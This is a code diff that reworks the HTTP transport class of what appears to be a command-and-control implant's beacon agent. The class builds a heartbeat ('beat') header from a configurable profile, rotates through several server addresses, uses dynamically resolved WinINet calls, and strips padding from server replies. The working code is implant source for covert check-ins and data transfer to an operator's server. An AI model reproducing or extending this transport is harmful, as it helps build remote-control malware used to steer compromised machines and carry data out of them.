@@ -73,32 +73,52 @@ ConnectorHTTP::ConnectorHTTP()
 	}
 }
 
-void ConnectorHTTP::SetConfig( BOOL Ssl, CHAR* UserAgent, CHAR* Method, ULONG AddressCount, CHAR** Address, WORD Port, CHAR* Uri, CHAR* Headers)
+void ConnectorHTTP::SetConfig(ProfileHTTP profile, CHAR* beat)
 {
-	this->server_count   = AddressCount;
-	this->server_address = Address;
-	this->server_port    = Port;
-	this->ssl            = Ssl;
-	this->http_method    = Method;
-	this->uri            = Uri;
-	this->headers        = Headers;
-	this->user_agent     = UserAgent;
+	ULONG beat_length = StrLenA(beat);
+	ULONG param_length = StrLenA((CHAR*) profile.parameter);
+	ULONG headers_length = StrLenA((CHAR*) profile.http_headers);
+
+	CHAR* HttpHeaders = (CHAR*)MemAllocLocal(param_length + beat_length + headers_length + 5);
+	memcpy(HttpHeaders, profile.http_headers, headers_length);
+	ULONG index = headers_length;
+	memcpy(HttpHeaders + index, profile.parameter, param_length);
+	index += param_length;
+	HttpHeaders[index++] = ':';
+	HttpHeaders[index++] = ' ';
+	memcpy(HttpHeaders + index, beat, beat_length);
+	index += beat_length;
+	HttpHeaders[index++] = '\r';
+	HttpHeaders[index++] = '\n';
+	HttpHeaders[index++] = 0;
+
+	this->headers        = HttpHeaders;
+	this->server_count   = profile.servers_count;
+	this->server_address = (CHAR**) profile.servers;
+	this->server_port    = profile.port;
+	this->ssl            = profile.use_ssl;
+	this->http_method    = (CHAR*) profile.http_method;
+	this->uri            = (CHAR*) profile.uri;
+	this->user_agent     = (CHAR*) profile.user_agent;
+	this->ans_size		 = profile.ans_size;
+	this->ans_pre_size   = profile.ans_pre_size;
 }
 
-BYTE* ConnectorHTTP::SendData(BYTE* data, ULONG data_size, ULONG* recv_size)
+void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
 {
+	this->recvSize = 0;
+	this->recvData = 0;
+
 	ULONG attempt   = 0;
-	BOOL  connected = false;
+	BOOL  connected = FALSE;
 	BOOL  result    = FALSE;
 	DWORD context   = 0;
-	BYTE* recv      = NULL;
-	*recv_size      = 0;
 
 	while ( !connected && attempt < this->server_count) {
 		DWORD dwError = 0;
 
 		if (!this->hInternet)
-			this->hInternet = this->functions->InternetOpenA(this->user_agent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+			this->hInternet = this->functions->InternetOpenA( this->user_agent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0 );
 		if ( this->hInternet ) {
 
 			if ( !this->hConnect )
@@ -112,7 +132,7 @@ BYTE* ConnectorHTTP::SendData(BYTE* data, ULONG data_size, ULONG* recv_size)
 				if (this->ssl)
 					flags |= INTERNET_FLAG_SECURE;
 
-				HINTERNET hRequest = this->functions->HttpOpenRequestA(this->hConnect, this->http_method, this->uri, 0, 0, rgpszAcceptTypes, flags, (DWORD_PTR)&context);
+				HINTERNET hRequest = this->functions->HttpOpenRequestA( this->hConnect, this->http_method, this->uri, 0, 0, rgpszAcceptTypes, flags, (DWORD_PTR)&context );
 				if (hRequest) {
 					if (this->ssl) {
 						DWORD dwFlags;
@@ -151,8 +171,8 @@ BYTE* ConnectorHTTP::SendData(BYTE* data, ULONG data_size, ULONG* recv_size)
 										}
 										numberReadedBytes += readedBytes;
 									}
-									*recv_size = numberReadedBytes;
-									recv = buffer;
+									this->recvSize = numberReadedBytes;
+									this->recvData = buffer;
 								}
 							}
 							else if (this->functions->GetLastError() == ERROR_HTTP_HEADER_NOT_FOUND) {
@@ -175,8 +195,8 @@ BYTE* ConnectorHTTP::SendData(BYTE* data, ULONG data_size, ULONG* recv_size)
 								}
 
 								if (numberReadedBytes) {
-									*recv_size = numberReadedBytes;
-									recv = buffer;
+									this->recvSize = numberReadedBytes;
+									this->recvData = buffer;
 								}
 								else {
 									this->functions->LocalFree(buffer);
@@ -211,7 +231,28 @@ BYTE* ConnectorHTTP::SendData(BYTE* data, ULONG data_size, ULONG* recv_size)
 			}
 		}
 	}
-	return recv;
+}
+
+BYTE* ConnectorHTTP::RecvData()
+{
+	if (this->recvData)
+		return this->recvData + this->ans_pre_size;
+	else
+		return NULL;
+}
+
+ULONG ConnectorHTTP::RecvSize()
+{
+	if (this->recvSize < this->ans_size)
+		return 0;
+
+	return this->recvSize - this->ans_size;
+}
+
+void ConnectorHTTP::RecvClear()
+{
+	if(this->recvData && this->recvSize)
+		MemFreeLocal((LPVOID*)& this->recvData, this->recvSize);
 }
 
 void ConnectorHTTP::CloseConnector()
